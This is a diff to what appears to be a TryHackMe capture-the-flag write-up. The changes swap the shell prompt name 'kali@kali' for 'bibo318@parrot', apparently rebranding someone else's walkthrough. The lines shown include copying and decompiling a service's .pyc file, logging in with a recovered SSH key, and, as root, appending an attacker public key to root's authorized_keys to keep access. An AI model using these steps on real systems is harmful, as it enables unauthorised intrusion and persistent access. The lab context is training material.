@@ -60,13 +60,13 @@ Password: TF)
 ```
 
 ```console
-kali@kali:~$ scp gherkin@$IP:/home/gherkin/cmd_service.pyc THM/hill/
+bibo318@parrot:~$ scp gherkin@$IP:/home/gherkin/cmd_service.pyc THM/hill/
 gherkin@10.10.65.138's password: 
 cmd_service.pyc 
 ```
 
 ```console
-[10.11.14.220]  kali@kali:~/THM/hill$ uncompyle6 cmd_service.pyc 
+[10.11.14.220]  bibo318@parrot:~/THM/hill$ uncompyle6 cmd_service.pyc 
 # uncompyle6 version 3.7.3
 # Python bytecode 3.8 (3413)
 # Decompiled from: Python 3.8.3 (default, May 14 2020, 11:03:12) 
@@ -195,8 +195,8 @@ Ve/kOlFaWKWJcQx5tkqIxmMpgJvT5tif01r1W2n6SgjD+VS2lII+T+gM32rHVttOhnR3dq
 ```
 
 ```console
-kali@kali:~/THM/hill$ chmod 700 id_rsa 
-kali@kali:~/THM/hill$ ssh dill@$IP -i id_rsa 
+bibo318@parrot:~/THM/hill$ chmod 700 id_rsa 
+bibo318@parrot:~/THM/hill$ ssh dill@$IP -i id_rsa 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -269,10 +269,10 @@ dill@ubuntu-xenial:~$
 ```
 
 ```console
-root@ubuntu-xenial:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsrlqENSp1GdI4o924mU3yiaDXr2vK50aAK1oeOmA+sTzA0AX8Lz3BTus2gX7VDNjhj9RA58Q8sPaMuzQJ5qfPTHi1u3WDbeL60EiOdM6DA9En6CiGlh2ixqO7rvtHqxP2q9BJM+/x0g20VA2Tp0/918m2pdFahOsbB1BVUs631VqD/Yt3CLtKFDIPi00I5gnIyCZ+1hxz5WUCO3Gh8zVwfe6/uwqRxFRyWx4hUDIrR7xlEP46M5goBtMXVRVjqLXBjH/iAT5TFdfaVWpM5YaXpAgy2zVpnDIim6Cio5R/v9gXbHFv7+l/+J4WwmSBg1ifPAkysLDeyZnhnB5/J3TMpLjQKW6vcRVe2vTncMGDh1qDCpZusgOBmOpanq+qTbP5izg8gZqp177ixXdaQtJulmRcx6aQbnj8oQUlTnIh7YTCTNGoGL3lQUDVUUrNHbNeUSwdy+whUB8rqW+PJTkOVqR6U7hLithlKZGEqea81FqT+2TBKDKacPqdGd2+jRk= kali@kali' >> .ssh/authorized_keys
+root@ubuntu-xenial:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsrlqENSp1GdI4o924mU3yiaDXr2vK50aAK1oeOmA+sTzA0AX8Lz3BTus2gX7VDNjhj9RA58Q8sPaMuzQJ5qfPTHi1u3WDbeL60EiOdM6DA9En6CiGlh2ixqO7rvtHqxP2q9BJM+/x0g20VA2Tp0/918m2pdFahOsbB1BVUs631VqD/Yt3CLtKFDIPi00I5gnIyCZ+1hxz5WUCO3Gh8zVwfe6/uwqRxFRyWx4hUDIrR7xlEP46M5goBtMXVRVjqLXBjH/iAT5TFdfaVWpM5YaXpAgy2zVpnDIim6Cio5R/v9gXbHFv7+l/+J4WwmSBg1ifPAkysLDeyZnhnB5/J3TMpLjQKW6vcRVe2vTncMGDh1qDCpZusgOBmOpanq+qTbP5izg8gZqp177ixXdaQtJulmRcx6aQbnj8oQUlTnIh7YTCTNGoGL3lQUDVUUrNHbNeUSwdy+whUB8rqW+PJTkOVqR6U7hLithlKZGEqea81FqT+2TBKDKacPqdGd2+jRk= bibo318@parrot' >> .ssh/authorized_keys
 ```
 ```console
-kali@kali:~/THM/hill$ ssh root@$IP
+bibo318@parrot:~/THM/hill$ ssh root@$IP
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
